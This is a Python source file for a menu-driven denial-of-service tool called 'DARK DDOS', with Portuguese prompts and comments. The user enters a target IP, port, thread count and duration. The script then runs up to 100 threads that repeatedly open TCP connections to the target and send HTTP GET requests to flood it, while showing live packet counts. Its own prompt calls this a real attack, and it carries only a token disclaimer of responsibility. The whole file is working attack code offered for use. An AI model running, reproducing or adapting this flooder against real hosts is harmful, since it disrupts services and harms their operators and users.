
import os
import sys
import time
import random
import socket
import threading
from platform import system

# Configurações
LIMITE_PACOTES = float('inf')  
packets_sent = 0
lock = threading.Lock()

def clearScr():
    if system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]
    
    banner = """
    
██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║███████║██████╔╝█████╔╝     ██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██╔══██║██╔══██╗██╔═██╗     ██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██║  ██║██║  ██║██║  ██╗    ██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝

Note! : I'm Not Responsible for any illegal usage.
Coded by : Crypt0r
Instagram: theyoungycc

[+] 1. Tool Option
"""
    
    for line in banner.split("\n"):
        if line.strip():  # Só mostra linhas não vazias
            sys.stdout.write(f"\x1b[1;{random.choice(colors)}m{line}{clear}\n")
            time.sleep(0.03)
        else:
            print()  # Linha vazia

def ataque_thread(target_ip, target_port, duration):
    """Função de ataque real para cada thread"""
    global packets_sent
    fim = time.time() + duration
    while time.time() < fim:
        try:
            # Criar socket e conectar
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            # Enviar dados (simulando requisição HTTP)
            sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            # Fechar conexão
            sock.close()
            # Contador thread-safe
            with lock:
                packets_sent += 1
        except:
            pass  # Silencia erros para não poluir a tela

def ataque_ddos():
    """Função principal de ataque"""
    global packets_sent
    clearScr()
    logo()
    print("\n⚠️  AVISO LEGAL - LEIA COM ATENÇÃO")
    print("="*50)
    print("Este é um ATAQUE REAL.")
    print("="*50)
    confirm = input("\nDigite 'EU ACEITO' para continuar: ")
    if confirm != "EU ACEITO":
        print("\n[!] Operação cancelada.")
        time.sleep(2)
        return
    # Coletar parâmetros
    print("\n📋 CONFIGURAÇÃO DO ATAQUE")
    print("="*40)
    target = input("IP do alvo (Target IP): ").strip()
    try:
        port = int(input("Porta (Port) [padrão 80]: ") or "80")
    except:
        port = 80
    try:
        threads = int(input("Número de threads [1-100, padrão 50]: ") or "50")
        if threads > 100:
            threads = 100
    except:
        threads = 50
    try:
        duration = int(input("Duração em segundos [padrão 60]: ") or "60")
    except:
        duration = 60
    # Confirmação final
    print("\n" + "="*40)
    print(f"🎯 Alvo: {target}:{port}")
    print(f"⚡ Threads: {threads}")
    print(f"⏱️  Duração: {duration}s")
    print("="*40)
    confirm2 = input("\nIniciar ataque? (s/n): ")
    if confirm2.lower() != 's':
        print("\n[!] Ataque cancelado.")
        time.sleep(2)
        return
    # Resetar contador
    packets_sent = 0
    # Iniciar ataque
    print("\n🔥 ATAQUE INICIADO - Pressione Ctrl+C para parar 🔥")
    print("="*50)
    try:
        # Criar e iniciar threads
        attack_threads = []
        for i in range(threads):
            t = threading.Thread(target=ataque_thread, args=(target, port, duration))
            t.daemon = True
            t.start()
            attack_threads.append(t)
        # Monitoramento em tempo real
        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            # Calcular taxa
            with lock:
                current_packets = packets_sent
            if elapsed > 0:
                rate = current_packets / elapsed
            else:
                rate = 0
            # Barra de progresso
            percent = (elapsed / duration) * 100
            bar_length = 30
            filled = int(bar_length * elapsed // duration)
            bar = '█' * filled + '░' * (bar_length - filled)
            # Limpar linha e mostrar status
            sys.stdout.write(f"\r📊 Progresso: [{bar}] {percent:.1f}%")
            sys.stdout.write(f" | 📨 Pacotes: {current_packets}")
            sys.stdout.write(f" | ⚡ Taxa: {rate:.1f}/s")
            sys.stdout.write(f" | ⏱️  Restam: {remaining:.1f}s")
            sys.stdout.flush()
            time.sleep(0.5)
        # Aguardar threads terminarem
        for t in attack_threads:
            t.join(timeout=1)
        # Relatório final
        print("\n\n" + "="*50)
        print("📋 RELATÓRIO FINAL")
        print("="*50)
        print(f"🎯 Alvo: {target}:{port}")
        print(f"⏱️  Duração real: {duration}s")
        print(f"📨 Total de pacotes: {packets_sent}")
        if duration > 0:
            print(f"⚡ Média de pacotes/seg: {packets_sent/duration:.2f}")
        print("="*50)
        print("\n✅ Ataque concluído!")
    except KeyboardInterrupt:
        print("\n\n⚠️  Ataque interrompido pelo usuário!")
        print(f"📨 Pacotes enviados até agora: {packets_sent}")
    input("\nPressione Enter para continuar...")

def main():
    while True:
        clearScr()
        logo()
        print("\n⚫ DARK DDOS ⚫")
        print("="*50)
        print("[1] Iniciar Ataque (Start Attack)")
        print("[0] Sair (Exit)")
        print("="*50)
        choice = input("CRYPT0R:~# ").strip()
        if choice == "1":
            ataque_ddos()
        elif choice == "0" or choice.lower() in ["exit", "quit", "q"]:
            print("\nClosing...\nPlease wait...")
            time.sleep(1.5)
            sys.exit()
        else:
            print("\n[!] Invalid Input!")
            time.sleep(1.5)

if __name__ == "__main__":
    main()